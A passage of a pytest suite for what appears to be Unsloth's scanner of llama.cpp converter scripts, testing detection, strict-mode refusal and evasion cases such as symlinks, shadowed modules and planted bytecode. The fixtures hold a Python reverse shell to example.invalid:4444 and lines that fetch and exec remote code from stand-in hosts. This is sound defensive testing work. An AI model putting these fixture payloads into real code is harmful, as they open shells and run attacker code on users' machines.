    started = time.perf_counter()
    scan.scan_converter_source(hostile, "x.py")
    assert time.perf_counter() - started < 10.0


def test_one_enormous_line_does_not_stall_evidence_extraction(scan):
    """Evidence is line-scoped, which is only a bound if lines are bounded."""
    import time

    source = ("socket " + "a" * 200000 + " .connect subprocess\n").encode()
    started = time.perf_counter()
    findings = scan.scan_converter_source(source, "x.py")
    assert time.perf_counter() - started < 10.0
    assert any("Reverse shell" in f.check for f in findings), [f.check for f in findings]


# ---------------------------------------------------------------------------
# Wiring into the export path.
# ---------------------------------------------------------------------------

_MINIMAL_CONVERTER = b"""\
import argparse
import gguf

class ModelBase:
    def __init__(self):
        self.metadata = gguf.Metadata.load(None, None, None)
        n_experts = self.hparams["num_experts"]

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("model", type=str)
    parser.add_argument("--outfile", type=str, default=None)
    parser.add_argument("--outtype", type=str, default="f16")
    return parser.parse_args()
"""


def _run_patcher(llama_cpp, tmp_path, monkeypatch, converter_bytes):
    """Drive the patcher off a local converter, writing only inside tmp_path."""
    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    converter = scripts_dir / "convert_hf_to_gguf.py"
    converter.write_bytes(converter_bytes)
    stat = converter.stat()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
    return llama_cpp._download_convert_hf_to_gguf_cached(
        "unsloth_convert_hf_to_gguf",
        (str(converter), stat.st_mtime_ns, stat.st_size),
        None,
    )


def test_export_scans_before_writing_the_patched_script(llama_cpp, tmp_path, monkeypatch):
    """The scan must see the bytes before they are patched, written or run."""
    seen = {}

    def _record(content, source, is_local_copy = False, log = None):
        seen["content"] = content
        seen["source"] = source
        seen["is_local_copy"] = is_local_copy
        seen["patched_exists"] = os.path.exists(
            os.path.join(str(tmp_path / "llama.cpp"), "unsloth_convert_hf_to_gguf.py")
        )
        return []

    monkeypatch.setattr(llama_cpp, "warn_on_suspicious_converter", _record)
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert seen["content"] == _MINIMAL_CONVERTER, "scan saw patched or truncated bytes"
    assert seen["patched_exists"] is False, "patched script existed before the scan ran"
    # A converter sitting in the llama.cpp directory with no prebuilt marker and
    # no UNSLOTH_LLAMA_CPP_SCRIPTS_DIR pin is not one the user chose, so it does
    # not get the strict-mode exemption. See the trusted-local tests below.
    assert seen["is_local_copy"] is False
    assert seen["source"].endswith("convert_hf_to_gguf.py")
    assert os.path.isfile(patched)


def test_export_survives_a_scanner_that_raises(llama_cpp, tmp_path, monkeypatch):
    """A bug in the scan cannot take down a legitimate conversion."""
    scan_module = _load("converter_scan_for_export", "unsloth_zoo/converter_scan.py")

    def _boom(*args, **kwargs):
        raise RuntimeError("scanner bug")

    monkeypatch.setattr(scan_module, "scan_converter_source", _boom)
    monkeypatch.setattr(
        llama_cpp, "warn_on_suspicious_converter", scan_module.warn_on_suspicious_converter,
    )
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
    assert os.path.isfile(patched)


def test_export_of_a_clean_local_converter_is_unchanged(llama_cpp, tmp_path, monkeypatch, caplog):
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(
            llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" not in caplog.text


def test_export_strict_mode_refuses_a_downloaded_converter_and_writes_nothing(
    llama_cpp, tmp_path, monkeypatch,
):
    """Drives the real export path with downloaded bytes and strict mode set.

    Covers the `except ConverterScanError: raise` clause: the refusal must keep
    its own message rather than come back relabelled as an introspection failure,
    and no patched script may reach disk.
    """
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with pytest.raises(llama_cpp.ConverterScanError) as excinfo:
        llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    message = str(excinfo.value)
    assert "Refusing to run" in message
    assert "loading/introspection" not in message
    assert not (scripts_dir / "unsloth_convert_hf_to_gguf.py").exists()


def test_export_of_a_downloaded_converter_is_not_refused_without_strict_mode(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    """Same flagged download, strict mode unset: warn and carry on."""
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )

    class _Response:
        content = payload

        def raise_for_status(self):
            return None

    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    monkeypatch.setattr(llama_cpp.requests, "get", lambda *a, **k: _Response())
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()

    with caplog.at_level("WARNING"):
        patched, _text, _vision = llama_cpp._download_convert_hf_to_gguf_cached(
            "unsloth_convert_hf_to_gguf", None, None,
        )
    assert os.path.isfile(patched)
    assert "suspicious pattern" in caplog.text
    assert CONVERTER_URL in caplog.text


def test_export_warns_but_completes_on_a_flagged_local_converter(
    llama_cpp, tmp_path, monkeypatch, caplog,
):
    payload = _MINIMAL_CONVERTER + (
        b"\nimport socket, subprocess\n"
        b"s = socket.socket(); s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n"
    )
    with caplog.at_level("WARNING"):
        patched, _text, _vision = _run_patcher(llama_cpp, tmp_path, monkeypatch, payload)
    assert "suspicious pattern" in caplog.text
    assert "Reverse shell" in caplog.text
    assert os.path.isfile(patched), "a warning must not block the export"


def test_only_a_pinned_converter_is_exempt_from_strict_mode(tmp_path, monkeypatch):
    """The exemption means "you chose this file", not "this file is on disk".

    When no prebuilt is available install_llama_cpp falls back to an unpinned
    git clone of upstream master, and _resolve_bundle_convert_script accepts that
    checkout on the strength of a conversion/ package alone. Treating it as a
    local copy let a suspicious converter fetched automatically from upstream be
    warned about but never refused, even under strict mode.
    """
    llama_cpp = _load("llama_cpp_trust_probe", "unsloth_zoo/llama_cpp.py")

    clone = tmp_path / "clone"
    clone.mkdir()
    script = clone / "convert_hf_to_gguf.py"
    script.write_text("# converter\n")

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    assert llama_cpp._converter_is_trusted_local(str(script)) is False, (
        "a bare checkout must not be exempt"
    )

    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(clone))
    assert llama_cpp._converter_is_trusted_local(str(script)) is True, (
        "an explicit pin is a deliberate user choice"
    )

    assert llama_cpp._converter_is_trusted_local(None) is False


def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypatch):
    """os.listdir saw immediate children only.

    A clean `conversion/__init__.py` doing `from .nested import x` fronted
    `conversion/nested/__init__.py`, which was neither scanned nor counted
    against the cap, and Python imported and ran it just the same.
    """
    llama_cpp = _load("llama_cpp_nested_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text(
        "from .nested import payload\n", encoding = "utf-8",
    )
    (nested / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )

    assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
        str(root / "conversion")
    )[0]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_nested_module_moves_the_patcher_cache_key(tmp_path):
    """The key has to cover the same set the scan reads, or a changed nested
    module is invisible to both."""
    llama_cpp = _load("llama_cpp_nested_key_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    nested = root / "conversion" / "nested"
    nested.mkdir(parents = True)
    (root / "conversion" / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (root / "conversion" / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    deep = nested / "helper.py"
    deep.write_text("Z = 1\n", encoding = "utf-8")

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None
    deep.write_text("Z = 2  # and a payload\n", encoding = "utf-8")
    assert llama_cpp._conversion_sibling_info(str(root)) != before


def test_an_oversized_conversion_package_is_reported_not_silently_truncated(
    tmp_path, monkeypatch, caplog
):
    """Scanning only the first MAX names let a payload hide past the cap.

    A package can put its payload in a late-sorting module and import it from an
    otherwise clean __init__.py; with the list silently truncated, strict mode
    executed the unscanned module with nothing reported at all. The cap stays --
    an attacker must not choose how much work this does -- so crossing it is
    itself the finding.
    """
    llama_cpp = _load("llama_cpp_cap_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    for index in range(llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1):
        (conversion / f"mod_{index:03d}.py").write_text("VALUE = 1\n")

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("more than the" in record.message for record in caplog.records), (
        f"the oversized package was not reported: {[r.message for r in caplog.records]}"
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "more than the"):
        llama_cpp._scan_conversion_package(str(root))

    # The same switch that silences every other finding silences this one.
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    llama_cpp._scan_conversion_package(str(root))


def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatch):
    """os.walk does not follow directory symlinks; the import machinery does.

    So `conversion/linked -> elsewhere`, imported as `conversion.linked` from an
    otherwise clean `__init__.py`, was never walked: the package read as fully
    scanned and strict mode ran the payload with nothing reported.
    """
    llama_cpp = _load("llama_cpp_symlink_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text(
        "from .linked import payload\n", encoding = "utf-8",
    )
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "__init__.py").write_text(
        "import subprocess\nsubprocess.run(['curl', 'http://evil'])\n",
        encoding = "utf-8",
    )
    try:
        (conversion / "linked").symlink_to(outside, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))[0]

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_symlink_loop_in_the_package_terminates(tmp_path):
    """Following directory symlinks is what lets a loop be walked forever.

    `conversion/loop -> conversion` is a cycle os.walk will happily descend until
    it runs out of path, so the walk has to notice a directory it already saw.
    """
    llama_cpp = _load("llama_cpp_symlink_loop_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    try:
        (conversion / "loop").symlink_to(conversion, target_is_directory = True)
    except (OSError, NotImplementedError):
        pytest.skip("this filesystem does not allow creating directory symlinks")

    walk = llama_cpp._conversion_package_modules(str(conversion))
    names, complete = walk.names, walk.complete

    # Terminating at all is the claim; the module is found once through the real
    # path, and the loop contributes at most the one pass before it is noticed.
    assert "__init__.py" in names
    assert len(names) <= 2


def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatch):
    """The cap bounded what got READ, not what got WALKED.

    conversion/ is attacker-supplied, so materializing the whole tree to discover
    it was too big hands over the unbounded time and memory the cap exists to
    deny -- and _conversion_sibling_info re-walks it before every cached export.
    """
    llama_cpp = _load("llama_cpp_walk_bound_probe", "unsloth_zoo/llama_cpp.py")

    conversion = tmp_path / "llama.cpp" / "conversion"
    conversion.mkdir(parents = True)
    # One file per directory, so each directory the walk yields is one more name:
    # stopping early has to mean visiting fewer directories, not just returning
    # fewer names from a tree it read in full.
    total = llama_cpp.MAX_CONVERSION_PACKAGE_FILES * 4
    for index in range(total):
        package = conversion / f"pkg_{index:04d}"
        package.mkdir()
        (package / "__init__.py").write_text("VALUE = 1\n", encoding = "utf-8")

    visited = []
    real_walk = os.walk

    def counting_walk(top, *args, **kwargs):
        for entry in real_walk(top, *args, **kwargs):
            visited.append(entry[0])
            yield entry

    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
    limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
    walk = llama_cpp._conversion_package_modules(
        str(conversion), file_limit = limit,
    )
    names, complete = walk.names, walk.complete

    assert len(names) == limit
    assert len(visited) <= limit + 1, (
        f"walked {len(visited)} directories of {total} to learn the cap was crossed"
    )

    # Unbounded by default, so a caller that has not asked for a bound still gets
    # the whole tree rather than a silently truncated one.
    visited.clear()
    assert len(llama_cpp._conversion_package_modules(str(conversion))[0]) == total


def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
    tmp_path, monkeypatch, caplog
):
    """Counting .py files bounds what gets READ, not what gets WALKED.

    Sixty modules and a very large number of other entries never reaches the file
    cap, so the whole attacker-sized directory was traversed anyway -- and
    _conversion_sibling_info re-walks it before every cached export.
    """
    llama_cpp = _load("llama_cpp_entry_bound_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    (conversion / "base.py").write_text("Y = 1\n", encoding = "utf-8")
    # Well past the entry budget, and holding no Python at all.
    entries = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 2
    for index in range(entries):
        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")

    visited = []
    real_walk = os.walk

    def counting_walk(top, *args, **kwargs):
        for entry in real_walk(top, *args, **kwargs):
            visited.append(entry[0])
            yield entry

    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
    walk = llama_cpp._conversion_package_modules(
        str(conversion),
        file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
        entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES,
    )
    names, complete = walk.names, walk.complete
    assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES
    assert complete is False, "an oversized tree must not report itself fully walked"

    # Too few modules to trip the file cap, so only the entry budget can report
    # this, and unread has to be said out loud rather than passing as clean.
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    assert any("directory entries" in record.message for record in caplog.records), (
        f"the unwalkable package was not reported: {[r.message for r in caplog.records]}"
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError, match = "directory entries"):
        llama_cpp._scan_conversion_package(str(root))


def test_the_cache_key_moves_when_the_bytes_do_under_a_preserved_mtime(tmp_path):
    """(path, mtime, size) is not an identity for a file.

    Replacing a module with same-sized content and restoring its mtime left the
    key identical, so a long-lived process returned the cached patcher without
    rescanning and the subprocess imported bytes nothing had read. A metadata
    copy away from deliberate, and free on a coarse-timestamp filesystem.
    """
    llama_cpp = _load("llama_cpp_key_identity_probe", "unsloth_zoo/llama_cpp.py")

    root = tmp_path / "llama.cpp"
    conversion = root / "conversion"
    conversion.mkdir(parents = True)
    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
    module = conversion / "base.py"
    module.write_text("VALUE = 1\n", encoding = "utf-8")
    stamp = os.stat(module)

    before = llama_cpp._conversion_sibling_info(str(root))
    assert before is not None

    # Same length, same mtime, different bytes.
    module.write_text("VALUE = 9\n", encoding = "utf-8")
    os.utime(module, ns = (stamp.st_atime_ns, stamp.st_mtime_ns))
    assert os.stat(module).st_mtime_ns == stamp.st_mtime_ns
    assert os.stat(module).st_size == stamp.st_size

    assert llama_cpp._conversion_sibling_info(str(root)) != before


def _pyc(flags: int) -> bytes:
    return b"\x00" * 4 + flags.to_bytes(4, "little") + b"\x00" * 56


def test_unsloths_own_routing_pin_does_not_buy_the_strict_exemption(tmp_path, monkeypatch):
    """MLX export installs llama.cpp and then points the patcher at it.

    Trust came from UNSLOTH_LLAMA_CPP_SCRIPTS_DIR alone, so a converter Unsloth
    had just downloaded read as one the user pinned and reviewed: strict mode
    only logged the entrypoint's findings instead of raising, and the imported
    packages were skipped entirely. The whole control was off for
    save_pretrained_gguf.
    """
    llama_cpp = _load("llama_cpp_routing_pin_probe", "unsloth_zoo/llama_cpp.py")

    installed = tmp_path / "llama.cpp"
    installed.mkdir()
    script = installed / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)

    with llama_cpp.internal_scripts_dir_pin(str(installed)):
        # Set, so the patcher still resolves against the install...
        assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(installed)
        # ...and still not the user's choice about these bytes.
        assert llama_cpp._converter_is_trusted_local(str(script)) is False

    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" not in os.environ


def test_a_real_user_pin_still_earns_the_exemption(tmp_path, monkeypatch):
    """The other half: a pin the user set must keep meaning "I chose this file",
    including when MLX routing runs inside it and points somewhere else."""
    llama_cpp = _load("llama_cpp_user_pin_probe", "unsloth_zoo/llama_cpp.py")

    chosen = tmp_path / "my-llama.cpp"
    chosen.mkdir()
    script = chosen / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(chosen))

    assert llama_cpp._converter_is_trusted_local(str(script)) is True

    elsewhere = tmp_path / "auto-installed"
    elsewhere.mkdir()
    with llama_cpp.internal_scripts_dir_pin(str(elsewhere)):
        # An existing pin is the user's and is left exactly as it is.
        assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(chosen)
        assert llama_cpp._converter_is_trusted_local(str(script)) is True

    assert os.environ["UNSLOTH_LLAMA_CPP_SCRIPTS_DIR"] == str(chosen)
    assert llama_cpp._converter_is_trusted_local(str(script)) is True


def test_the_converter_cache_key_carries_whether_the_pin_was_the_users(tmp_path, monkeypatch):
    """The internal-pin distinction is only as good as the key that carries it.

    A first call under an explicit user pin can accept a flagged converter as
    trusted and cache it. If the variable is then cleared and MLX routes to the
    same folder, every other component of the key is identical, so the cached
    result comes back without the trust test or the package scan running again
    and strict mode accepts it after all.
    """
    llama_cpp = _load("llama_cpp_trust_key_probe", "unsloth_zoo/llama_cpp.py")

    folder = tmp_path / "llama.cpp"
    folder.mkdir()
    script = folder / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    seen = []

    def record(
        name, local_info, conversion_info, scan_mode = None, trusted = False, stuck = (),
    ):
        seen.append(trusted)
        return "patched"

    monkeypatch.setattr(
        llama_cpp, "_download_convert_hf_to_gguf_cached", record,
    )
    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)

    monkeypatch.setenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", str(folder))
    llama_cpp._download_convert_hf_to_gguf()

    monkeypatch.delenv("UNSLOTH_LLAMA_CPP_SCRIPTS_DIR", raising = False)
    with llama_cpp.internal_scripts_dir_pin(str(folder)):
        llama_cpp._download_convert_hf_to_gguf()

    # Same folder, same file, same switches: only provenance differs, and if it
    # does not reach the key then lru_cache serves the trusted answer to both.
    assert seen == [True, False], seen


def test_bytecode_appearing_after_a_cached_export_is_still_purged(tmp_path, monkeypatch):
    """The purge used to live inside the cached function.

    So once strict mode had completed one clean export in a long-lived process,
    dropping a fresh valid .pyc beside an unchanged source left every component
    of the key identical: the cached result came back, nothing purged it, and the
    next converter subprocess executed it.
    """
    llama_cpp = _load("llama_cpp_purge_before_cache_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    script = root / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)
    monkeypatch.setattr(
        llama_cpp, "_download_convert_hf_to_gguf_cached", lambda *a, **k: "patched",
    )

    llama_cpp._download_convert_hf_to_gguf()          # the first, clean export

    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    planted = cache / "base.cpython-313.pyc"
    planted.write_bytes(_pyc(0))

    llama_cpp._download_convert_hf_to_gguf()          # served from cache, and yet
    assert not planted.exists(), "bytecode planted after a cached export survived"


def test_bytecode_that_cannot_be_purged_reaches_the_cache_key(tmp_path, monkeypatch):
    """Deleting is the defence; when it fails the scan has to run and say so, and
    it will not run if the key looks the same as the clean export before it."""
    llama_cpp = _load("llama_cpp_stuck_key_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    script = root / "convert_hf_to_gguf.py"
    script.write_text("import gguf\n", encoding = "utf-8")
    info = (str(script), os.stat(script).st_mtime_ns, os.stat(script).st_size)

    seen = []

    monkeypatch.setattr(llama_cpp, "_resolve_local_convert_script", lambda: info)
    monkeypatch.setattr(llama_cpp, "_patch_tensor_mapping_for_qwen35", lambda *a, **k: None)
    monkeypatch.setattr(
        llama_cpp,
        "_download_convert_hf_to_gguf_cached",
        lambda *args, **kwargs: seen.append(args[-1]) or "patched",
    )

    llama_cpp._download_convert_hf_to_gguf()

    cache = root / "conversion" / "__pycache__"
    cache.mkdir()
    (cache / "base.cpython-313.pyc").write_bytes(_pyc(0))
    real_remove = os.remove

    def refuse(path, *args, **kwargs):
        if str(path).endswith(".pyc"):
            raise PermissionError(13, "read-only file system", str(path))
        return real_remove(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "remove", refuse)
    llama_cpp._download_convert_hf_to_gguf()

    assert seen[0] == ()
    assert seen[1] == ("conversion/__pycache__/base.cpython-313.pyc",), seen[1]


def test_an_unreadable_directory_does_not_silence_the_whole_package(
    tmp_path, monkeypatch, caplog
):
    """One scandir failure used to discard everything already collected.

    The walk returned (None, False) and the scan returned without a word, so an
    untrusted package could pair an unreadable directory with a readable module
    its initializer imports and strict mode would run that module reporting
    nothing at all.
    """
    llama_cpp = _load("llama_cpp_unreadable_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    (conversion / "payload.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )
    locked = conversion / "locked"
    locked.mkdir()

    real_scandir = os.scandir

    def refuse(path, *args, **kwargs):
        if str(path) == str(locked):
            raise PermissionError(13, "permission denied", str(path))
        return real_scandir(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)

    walk = llama_cpp._conversion_package_modules(str(conversion))
    assert "payload.py" in walk.names, "modules found before the failure were discarded"
    assert walk.unreadable == ("locked",), walk.unreadable
    assert walk.complete is False

    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))
    messages = [record.message for record in caplog.records]
    # Both: the directory nothing could read, and the payload that was readable.
    assert any("could not read" in message for message in messages), messages
    assert any("example.invalid" in message or "remote" in message.lower()
               for message in messages), messages

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_package_directory_that_cannot_be_opened_at_all_is_still_reported(
    tmp_path, monkeypatch
):
    """The top of the tree is the one case where nothing can be collected, and it
    must not read as an empty, clean package either."""
    llama_cpp = _load("llama_cpp_unreadable_top_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    conversion = root / "conversion"
    real_scandir = os.scandir

    def refuse(path, *args, **kwargs):
        if str(path) == str(conversion):
            raise PermissionError(13, "permission denied", str(path))
        return real_scandir(path, *args, **kwargs)

    monkeypatch.setattr(llama_cpp.os, "scandir", refuse)
    walk = llama_cpp._conversion_package_modules(str(conversion))
    assert walk.names is None and walk.unreadable == (".",)

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError, match = "could not read"):
        llama_cpp._scan_conversion_package(str(root))


def test_a_root_module_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
    """The converter's own directory is sys.path[0] for the subprocess.

    It is searched before the gguf-py entry the entrypoint inserts at index 1, so
    a root-level gguf.py wins over gguf-py/gguf: verified outside this suite, a
    root gguf.py imported in place of the real package. Scanning only the named
    packages left it executing under a clean entrypoint and clean packages.
    """
    llama_cpp = _load("llama_cpp_shadow_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    gguf = root / "gguf-py" / "gguf"
    gguf.mkdir(parents = True)
    (gguf / "__init__.py").write_text("WHO = 'real'\n", encoding = "utf-8")
    (root / "gguf.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, monkeypatch):
    """A root directory carrying __init__.py shadows the same way and its code
    runs on import, unlike a namespace directory, which imports to nothing."""
    llama_cpp = _load("llama_cpp_shadow_pkg_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    shadow = root / "gguf"
    shadow.mkdir()
    (shadow / "__init__.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_directory_nothing_imports_is_not_scanned(tmp_path, monkeypatch, caplog):
    """The scan follows imports, so a directory no import can reach is not read.

    Scanning every directory in the checkout instead was measured against a real
    clone of llama.cpp master: 18 files reported and 87 log lines on a single
    export, and under UNSLOTH_CONVERTER_SCAN_STRICT the export was refused
    outright over scripts/server-bench.py, which polls a /health endpoint in a
    while loop, and examples/llama-eval/llama-eval.py, which spawns a process.
    Both are ordinary upstream utilities the converter never imports. A control
    that rejects every clean upstream checkout is not a control.
    """
    llama_cpp = _load("llama_cpp_import_scope_probe", "unsloth_zoo/llama_cpp.py")

    root = _package_root(tmp_path)
    # Shaped like upstream's: a benchmark utility nothing imports.
    bench = root / "scripts"
    bench.mkdir()
    (bench / "server_bench.py").write_text(
        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
        encoding = "utf-8",
    )

    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    caplog.clear()
    with caplog.at_level(logging.WARNING):
        llama_cpp._scan_conversion_package(str(root))     # no refusal
    assert not [r for r in caplog.records if "suspicious" in r.message], (
        [r.message for r in caplog.records]
    )
    assert "scripts" not in {
        location.label for location in llama_cpp._scanned_locations(str(root)).locations
    }

    # The same directory, once something the converter runs imports its name.
    _converter_imports(root, "scripts")
    with pytest.raises(llama_cpp.ConverterScanError):
        llama_cpp._scan_conversion_package(str(root))


def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
